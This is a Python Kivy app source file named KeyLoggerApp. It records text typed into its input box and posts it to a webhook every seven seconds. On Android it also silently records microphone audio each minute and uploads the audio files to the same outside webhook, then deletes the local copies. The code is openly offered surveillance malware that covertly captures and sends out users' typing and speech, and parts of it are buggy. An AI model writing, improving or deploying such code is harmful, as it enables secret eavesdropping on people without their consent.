import os
import threading
import time
from datetime import datetime
import requests
from dotenv import load_dotenv
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform
from kivy.logger import Logger
import pyaudio
import wave

class KeyLoggerApp(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        load_dotenv()
        self.webhook_url = os.getenv("WEBHOOK_URL")
        self.text_buffer = []
        self.audio_folder = "audio"
        self.audio_filename = "audio.wav"
        self.time_interval = 7  # Seconds

        # Create audio folder
        if not os.path.exists(self.audio_folder):
            os.makedirs(self.audio_folder)

    def send_data(self):
        """Send captured text to webhook."""
        if not self.text_buffer:
            return

        data = {"content": "".join(self.text_buffer)}
        try:
            response = requests.post(self.webhook_url, data=data)
            Logger.info(f"Data sent: {response.status_code}")
        except Exception as e:
            Logger.error(f"Failed to send data: {e}")

        # Clear buffer
        self.text_buffer = []

        # Schedule next send
        threading.Timer(self.time_interval, self.send_data).start()

    def record_audio(self):
        """Record audio for 5 seconds and send to webhook."""
        if platform != "android":
            Logger.warning("Audio recording only supported on Android")
            return

        # Using pyaudio for simplicity (Note: Android needs pyjnius for native MediaRecorder)
        audio = pyaudio.PyAudio()
        try:
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        except Exception as e:
            Logger.error(f"Failed to open audio stream: {e}")
            return

        frames = []
        for _ in range(0, int(44100 / 1024 * 5)):
            data = stream.read(1024, exception_on_overflow=False)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        # Save audio
        audio_path = os.path.join(self.audio_folder, self.audio_filename)
        try:
            with wave.open(audio_path, "wb") as wave_file:
                wave_file.setnchannels(1)
                wave_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wave_file.setframerate(44100)
                wave_file.writeframes(b"".join(frames))
        except Exception as e:
            Logger.error(f"Failed to save audio: {e}")
            return

        # Send audio
        try:
            with open(audio_path, "rb") as f:
                files = {"file": (self.audio_filename, f, "audio/wav")}
                requests.post(self.webhook_url, files=files)
        except Exception as e:
            Logger.error(f"Failed to send audio: {e}")

        # Cleanup
        if os.path.exists(audio_path):
            os.remove(audio_path)

        # Schedule next recording
        threading.Timer(60, self.record_audio).start()

    def build(self):
        """Build the Kivy UI."""
        layout = BoxLayout(orientation="vertical", padding=10, spacing=10)
        self.text_input = TextInput(hint_text="Type here...", multiline=True)
        self.text_input.bind(text=self.on_text)
        send_button = Button(text="Send Data", size_hint=(1, 0.2))
        send_button.bind(on_press=self.manual_send)

        layout.add_widget(self.text_input)
        layout.add_widget(send_button)

        # Start background tasks
        self.send_data()
        self.record_audio()

        return layout

    def on_text(self, instance, value):
        """Capture text input."""
        self.text_buffer.append(value[-1] if value else "")

    def manual_send(self, instance):
        """Manually send data."""
        self.send_data()

if __name__ == "__main__":
    KeyLoggerApp().run()